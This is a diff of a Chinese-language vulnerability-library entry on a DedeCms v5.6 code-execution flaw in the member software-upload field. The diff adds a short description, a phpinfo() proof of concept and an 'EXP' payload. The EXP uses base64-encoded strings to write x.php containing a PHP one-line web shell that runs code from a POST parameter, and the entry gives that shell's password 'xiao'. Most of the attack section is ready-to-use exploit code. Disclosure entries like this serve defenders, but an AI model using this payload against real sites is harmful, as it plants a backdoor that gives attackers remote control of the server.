@@ -1,15 +1,35 @@
----
+# DedeCms v5.6 嵌入恶意代码执行漏洞
 
-title: 'DedeCms v5.6 嵌入恶意代码执行漏洞'
-date: Wed, 14 Oct 2020 01:00:11 +0000
-draft: false
-tags: ['白阁-漏洞库']
----
+## 漏洞简介
 
-#### 影响版本
+在上传软件的地方，对本地地址没有进行有效的验证，可以被恶意利用。
+
+## 影响版本
 
 DedeCms v5.6
 
-#### 复现
+## 复现
 
-注册会员，上传软件：本地地址中填入 ![](DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/QQ%E6%88%AA%E5%9B%BE20201014085731.jpg) ![](DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/QQ%E6%88%AA%E5%9B%BE20201014085849.jpg) 生成x.php 密码xiao，直接生成一句话。
+注册会员，上传软件：本地地址中填入如下：
+
+### POC
+
+```
+a{/dede:link}{dede:toby57 name\="']=0;phpinfo();//"}x{/dede:toby57}，
+```
+
+发表后查看或修改即可执行。
+
+### EXP
+
+```
+a{/dede:link}{dede:toby57 name\="']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//"}x{/dede:toby57}
+```
+
+生成x.php 密码：xiao直接生成一句话。
+
+
+
+## 参考
+
+知道创宇：https://www.seebug.org/vuldb/ssvid-20352
